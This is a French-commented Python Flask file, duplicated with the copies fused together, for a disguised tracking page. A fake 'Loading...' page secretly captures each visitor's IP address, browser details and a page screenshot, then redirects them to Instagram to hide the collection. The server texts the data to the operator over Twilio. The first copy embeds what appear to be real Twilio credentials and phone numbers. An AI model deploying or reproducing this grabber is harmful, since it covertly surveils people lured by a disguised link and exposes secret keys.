from flask import Flask, request, jsoniffrom twilio.rest import Client
import os

app = Flask(__name__)

# Twilio config
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = 'ab95f4ee6a016c23b123670550a6cde7'
from_number = '+12524866318'
to_number = '+33635960569'

client = Client(account_sid, auth_token)

def send_sms(info):
    try:
        message = client.messages.create(
            body=info,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur SMS : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head>
        <title>Loading...</title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    </head>
    <body>
        <h1>Chargement...</h1>
        <script>
            async function getInfo() {
                const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
                const browserData = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack
                };

                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL();
                    fetch("/log", {
                        method: "POST",
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            ip: ipData.ip,
                            browser: browserData,
                            screenshot: screenshot
                        })
                    }).then(() => {
                        window.location.href = "https://www.instagram.com";
                    });
                });
            }
            getInfo();
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    browser = data.get('browser')
    screenshot = data.get('screenshot')

    log_info = f"""
[+] Nouvelle visite :
IP : {ip}
User-Agent : {browser.get('userAgent')}
Langue : {browser.get('language')}
Plateforme : {browser.get('platform')}
Do Not Track : {browser.get('doNotTrack')}
"""

    print(log_info)
    send_sms(log_info[:1600])  # SMS limit

    with open("log.txt", "a") as f:
        f.write(log_info + "\n")

    # Enregistre aussi le screenshot (si besoin plus tard)
    if screenshot:
        import base64
        with open(f"screenshot_{ip.replace('.', '_')}.png", "wb") as img_file:
            img_file.write(base64.b64decode(screenshot.split(',')[1]))

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True)from flask import Flask, request, jsonify
from twilio.rest import Client
import os

app = Flask(__name__)

# Twilio config
account_sid = 'TON_SID'
auth_token = 'TON_TOKEN'
from_number = 'TON_NUM_TWILIO'
to_number = 'TON_NUM_PERSO'

client = Client(account_sid, auth_token)

def send_sms(info):
    try:
        message = client.messages.create(
            body=info,
            from_=from_number,
            to=to_number
        )
        print(f"[+] SMS envoyé : {message.sid}")
    except Exception as e:
        print(f"[!] Erreur SMS : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head>
        <title>Loading...</title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    </head>
    <body>
        <h1>Chargement...</h1>
        <script>
            async function getInfo() {
                const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
                const browserData = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack
                };

                html2canvas(document.body).then(canvas => {
                    const screenshot = canvas.toDataURL();
                    fetch("/log", {
                        method: "POST",
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            ip: ipData.ip,
                            browser: browserData,
                            screenshot: screenshot
                        })
                    }).then(() => {
                        window.location.href = "https://www.instagram.com";
                    });
                });
            }
            getInfo();
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    browser = data.get('browser')
    screenshot = data.get('screenshot')

    log_info = f"""
[+] Nouvelle visite :
IP : {ip}
User-Agent : {browser.get('userAgent')}
Langue : {browser.get('language')}
Plateforme : {browser.get('platform')}
Do Not Track : {browser.get('doNotTrack')}
"""

    print(log_info)
    send_sms(log_info[:1600])  # SMS limit

    with open("log.txt", "a") as f:
        f.write(log_info + "\n")

    # Enregistre aussi le screenshot (si besoin plus tard)
    if screenshot:
        import base64
        with open(f"screenshot_{ip.replace('.', '_')}.png", "wb") as img_file:
            img_file.write(base64.b64decode(screenshot.split(',')[1]))

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True)
